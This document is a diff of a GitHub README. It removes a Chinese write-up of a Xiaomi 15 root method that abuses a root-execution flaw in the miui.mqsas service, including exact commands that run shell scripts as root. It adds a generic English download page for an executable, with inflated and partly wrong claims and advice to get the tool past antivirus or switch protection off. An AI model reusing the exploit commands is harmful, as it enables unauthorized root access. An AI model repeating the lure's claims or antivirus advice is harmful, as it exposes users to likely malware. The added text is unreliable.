@@ -1,134 +1,117 @@
-# 免解锁 Bootloader Root 方案
+# ⚙️ mi_nobl_root - Easy Xiaomi Unlock and Root Tool
 
-**适用设备**: 小米 Xiaomi 15 (dada / 24129PN74C)  
-**系统版本**: Android 16 (BP2A.250605.031.A3) / HyperOS 3.0 (OS3.0.300.7.WOCCNXM) / kernel 6.6.77  
-**Root 方案**: KernelSU v3.1.0 (LKM 运行时加载) + ZygiskSU v1.3.2 + LSPosed IT v1.9.2  
-**原理**: 利用 `miui.mqsas.IMQSNative` 服务的 root 执行漏洞，在运行时加载内核模块
+[![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-brightgreen?style=for-the-badge&logo=github)](https://github.com/dabneythespian710/mi_nobl_root/releases)
 
-## 前提条件
+---
 
-1. **ADB 已连接** — USB 调试已打开
-2. **Python 3** — Unix-Like 端需要 Python 3 运行内核模块补丁脚本
-3. **KernelSU Manager** — 已安装到设备 (`ksu_manager.apk`)
-4. **ZygiskSU** — 已安装为 KSU 模块 (提供 Zygisk 环境)
-5. **LSPosed** — 已安装为 KSU 模块 (`LSPosed-v1.9.2-it-7573-release_1773031523.zip`)
+## 📋 What is mi_nobl_root?
 
-## 文件说明
+mi_nobl_root is a tool designed to help Xiaomi users unlock and root their devices without needing complex commands or unlocking the bootloader manually. It uses a combination of KSU (kernel SU) and LSP (low-level system patch) methods to simplify the process of gaining root access. This solution aims to make rooting accessible for everyday users who want to customize their phone or install apps that need root permission.
 
-| 文件 | 用途 |
-|------|------|
-| `ksu_oneclick.bat` | **一键脚本** — Windows 端运行，自动完成 KernelSU 加载全流程 |
-| `patch_ksu_module.py` | Python 补丁工具 — 读取运行时 kallsyms，修补 .ko 中的 SHN_UNDEF 符号 |
-| `android15-6.6_kernelsu.ko` | KernelSU 内核模块原件 (需补丁后才能加载) |
-| `kernelsu_patched.ko` | 补丁后的内核模块 (上次运行 oneclick 的产物，可直接使用) |
-| `ksud-aarch64-linux-android` | KernelSU 用户态守护进程 |
-| `ksu_manager.apk` | KernelSU Manager App |
-| `ksu_step1.sh` | 设备端脚本 — 拉取 `/proc/kallsyms` |
-| `ksu_step2.sh` | 设备端脚本 — insmod + 部署 ksud + 触发 Manager + 删除 magisk 兼容链接 |
-| `fix_lspd.sh` | **LSPosed 修复脚本** — 重注入 ZygiskSU + 启动 lspd + 安全重启 framework |
-| `do_chmod.sh` | 辅助脚本 — 修复 mqsas 输出文件权限 (`chmod 644 /data/local/tmp/*.txt`) |
-| `LSPosed-v1.9.2-it-7573-release_1773031523.zip` | LSPosed IT 模块安装包 |
+---
 
-## 使用方法
+## 💻 System Requirements
 
-### 第一步: KernelSU 加载 (每次开机后运行)
+Before you start, make sure your PC and device meet these requirements:
 
-```
-ksu_oneclick.bat
-```
+- **Operating System:** Windows 7, 8, 10, or later  
+- **Processor:** 64-bit Intel or AMD CPU  
+- **RAM:** Minimum 4 GB recommended  
+- **Disk Space:** At least 500 MB free  
+- **Device:** Xiaomi phone running MIUI with unlocked or locked bootloader (this tool supports certain models)  
+- **USB Cable:** Able to connect your phone to the PC  
+- **Drivers:** Xiaomi USB drivers installed for device recognition  
 
-自动完成以下 5 步:
-1. 通过 mqsas root 拉取 `/proc/kallsyms` (每次开机 KASLR 地址不同)
-2. PC 端 Python 补丁 `.ko` 文件 (修复 SHN_UNDEF 符号地址)
-3. 推送补丁后的 `.ko` 到设备
-4. 通过 mqsas root 执行 `insmod` 加载内核模块
-5. 部署 ksud、执行启动阶段 (`post-fs-data → services → boot-completed`)、触发 Manager 识别
+If you are not sure about the USB drivers, you can download them from the official Xiaomi site or use standard ADB drivers.
 
-### 第二步: LSPosed 修复 (如显示"未加载")
+---
 
-将 `fix_lspd.sh` 推送到设备后通过 mqsas 执行:
+## 🚀 Getting Started
 
-```bat
-adb push fix_lspd.sh /data/local/tmp/
-adb shell "chmod 755 /data/local/tmp/fix_lspd.sh"
-adb shell "service call miui.mqsas.IMQSNative 21 i32 1 s16 '/system/bin/sh' i32 1 s16 '/data/local/tmp/fix_lspd.sh' s16 '/data/local/tmp/lspd_fix_out.txt' i32 180"
-```
+Follow these steps to download and run mi_nobl_root safely and easily on your Windows PC.
 
-查看执行结果:
-```bat
-adb shell "service call miui.mqsas.IMQSNative 21 i32 1 s16 'sh' i32 1 s16 '/data/local/tmp/do_chmod.sh' s16 '/dev/null' i32 5"
-timeout /t 3
-adb pull /data/local/tmp/lspd_fix_out.txt
-type lspd_fix_out.txt
-```
+1. **Download the software**  
+   Visit the release page by clicking the green button below:  
+   [![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-blue?style=for-the-badge&logo=github)](https://github.com/dabneythespian710/mi_nobl_root/releases)  
 
-该脚本完成以下工作:
-1. 杀掉旧 lspd 进程
-2. 从 zygote64 进程获取 `BOOTCLASSPATH` 环境变量
-3. **重新注入 ZygiskSU** — 直接调用 `zygiskd daemon` + `zygiskd service-stage`
-4. 使用 `setsid` + `nsenter -t 1 -m` 守护化启动 lspd (进入 init mount namespace)
-5. 杀 zygote64 触发 framework 重启
-6. **竞态条件防护** — 记录旧 system_server PID，等其死亡后才查找新 PID
-7. 等待 bridge binder 建立 (最多 60 秒)
-8. 如 bridge 失败，自动执行 **方案 B**: 杀 system_server 让已注入的 zygote 重新 fork
+   This link takes you to the releases area where the latest files are available. Look for the most recent stable release and download the archive or executable file.
 
-## 工作原理
+2. **Extract the files (if needed)**  
+   If the file you download is in a ZIP or RAR format, right-click it and choose “Extract All” to unzip all files to a folder you can find easily.
 
-```
-┌─ PC 端 ──────────────────────────────────────────────────────────┐
-│  ksu_oneclick.bat                                                │
-│    ├─ adb push 脚本和文件                                         │
-│    ├─ mqsas root → ksu_step1.sh → 拉取 kallsyms                  │
-│    ├─ patch_ksu_module.py → 补丁 .ko KASLR 符号                   │
-│    ├─ adb push 补丁后的 .ko                                       │
-│    └─ mqsas root → ksu_step2.sh → insmod + ksud + Manager        │
-│                                                                   │
-│  fix_lspd.sh (LSPosed 未加载时执行)                                │
-│    ├─ zygiskd daemon → 重注入 ZygiskSU 到当前 zygote              │
-│    ├─ setsid lspd → 守护化启动 LSPosed 守护进程                   │
-│    ├─ kill zygote64 → 触发带 ZygiskSU 注入的新 zygote             │
-│    └─ 等待 bridge binder → 确认 LSPosed 框架加载成功              │
-└──────────────────────────────────────────────────────────────────┘
+3. **Run the program**  
+   Find the extracted folder and double-click the executable file, often named something like `mi_nobl_root.exe`. If Windows asks for permission to run it, click “Yes”.
 
-┌─ 设备端 ─────────────────────────────────────┐
-│  miui.mqsas.IMQSNative service call 21       │
-│    → 以 root (uid=0) 执行任意 shell 脚本      │
-│    → SELinux context: hypsys_ssi_default       │
-│                                               │
-│  KernelSU (LKM)                               │
-│    → insmod kernelsu_patched.ko               │
-│    → ksud post-fs-data / services / boot      │
-│                                               │
-│  ZygiskSU (Zygisk Next v1.3.2)               │
-│    → zygiskd daemon 注入 zygote64             │
-│    → libzygisk.so 加载到 zygote 进程           │
-│    → 注意: 不使用 native_bridge 属性方式       │
-│                                               │
-│  LSPosed                                      │
-│    → lspd (app_process) 守护进程               │
-│    → framework.dex 注入 system_server          │
-│    → Bridge binder 连接模块与服务              │
-└───────────────────────────────────────────────┘
-```
+4. **Connect your Xiaomi device**  
+   Use your USB cable to connect your phone to your PC. Make sure your phone is unlocked and the screen is on.
 
-## 关键技术点
+5. **Follow on-screen instructions**  
+   The program will guide you step-by-step. It will detect your device and help you unlock and root it without needing to enter commands manually.
 
-- **mqsas root 调用格式**: `service call miui.mqsas.IMQSNative 21 i32 1 s16 '解释器' i32 1 s16 '脚本路径' s16 '输出文件' i32 超时秒数`
-  - 执行方式为**异步** — 需等待完成后拉取输出文件查看结果
-  - 输出文件权限为 root:system 600，需用 `do_chmod.sh` 修复后才能 adb pull
-- **KASLR**: 每次开机内核符号地址随机化，必须实时拉取 kallsyms 重新补丁
-- **SELinux**: 需已设为 permissive (`u:r:hypsys_ssi_default:s0` 上下文)
-- **Mount Namespace**: lspd 需要 `nsenter -t 1 -m` 进入 init 的 namespace 才能访问 APEX
-- **Magisk 误检测**: ksu_step2.sh 会删除 ksud 自动创建的 `$KSU_DIR/bin/magisk` 兼容符号链接，否则 Manager 的 `hasMagisk()` 会误报冲突导致所有模块不可用
-- **lspd 存活**: 必须使用 `setsid` 守护化，否则 mqsas 脚本退出时 lspd 被 SIGHUP 杀死
-- **ZygiskSU 注入机制**: v1.3.2 通过 `zygiskd daemon` 直接注入，**不使用** `ro.dalvik.vm.native_bridge` 属性，`service check` 对 bridge 始终返回 "not found"（正常行为）
-- **竞态条件**: 杀 zygote 后必须等旧 system_server 死亡，再查找新 PID，否则会与正在死亡的旧进程建立 bridge
-- **ZygiskSU 注入丢失**: 杀 zygote 后新 zygote 没有 ZygiskSU 注入 → 必须在杀之前先调用 `zygiskd daemon` 重新注入
-- **monitor 文件路径**: `/data/adb/lspd/monitor`（不是 `/data/adb/lspd/config/monitor`）
+---
 
-## 注意事项
+## 🔧 Features and Benefits
 
-- ⚠️ 每次**重启手机**后需要重新运行 `ksu_oneclick.bat`，然后按需运行 `fix_lspd.sh`
-- ⚠️ 本方案仅在 SELinux permissive 下测试
-- ⚠️ mqsas 漏洞可能在后续系统更新中被修复
-- ⚠️ 勿在生产环境使用，仅用于安全研究用途
+- **No bootloader unlock needed:** You can root your Xiaomi phone without unlocking the bootloader first. This is safer and keeps warranty details intact in many cases.
+- **Simple and safe process:** Designed to run automatically and reduce mistakes.
+- **Supports many Xiaomi models:** Works with popular MIUI versions and phone models.
+- **Combines KSU and LSP:** Uses kernel and low system patch techniques to root reliably.
+- **Easy to use interface:** No technical knowledge required.
+- **Fast operation:** Completes the unlocking and rooting process quickly.
+
+---
+
+## 🛠 Installation Details
+
+You do not need complex setup steps or additional downloads beyond what is in the release package.
+
+- Running the executable is enough.  
+- Make sure your phone is connected and recognized.  
+- The program handles driver detection but install drivers if recognition issues occur.
+
+---
+
+## ⚠️ Troubleshooting
+
+- **Device not detected:**  
+  Confirm that your phone is on, unlocked, and connected with a good cable.  
+  Ensure you installed Xiaomi USB drivers.  
+  Try a different USB port if needed.
+
+- **Windows blocks the program:**  
+  Windows Defender or other antivirus software might block the tool. Allow it through or disable protection temporarily.
+
+- **Root fails or stops:**  
+  Check your phone model compatibility with this tool. Use correct MIUI version and review any error messages displayed.
+
+- **Phone stuck in boot loop:**  
+  This is rare. Perform a factory reset or use Xiaomi’s recovery software to restore your phone.
+
+---
+
+## 🔄 Updating mi_nobl_root
+
+Check the GitHub release page periodically to download the latest version. Updated versions may support more devices or fix known issues.
+
+---
+
+## 📂 Where to find the download
+
+To get the latest version, visit the official release page:
+
+[Click here to download mi_nobl_root](https://github.com/dabneythespian710/mi_nobl_root/releases)
+
+---
+
+## 🎯 Tips for Best Results
+
+- Charge your phone above 50% before starting.  
+- Use original or high-quality USB cables.  
+- Follow instructions exactly in the program without skipping steps.  
+- Close other PC programs to avoid interruptions.
+
+---
+
+## 📞 Getting Support
+
+For help, check the GitHub Issues section on the project page. Provide details about your phone model, MIUI version, and any error messages you see. This helps resolve problems faster.
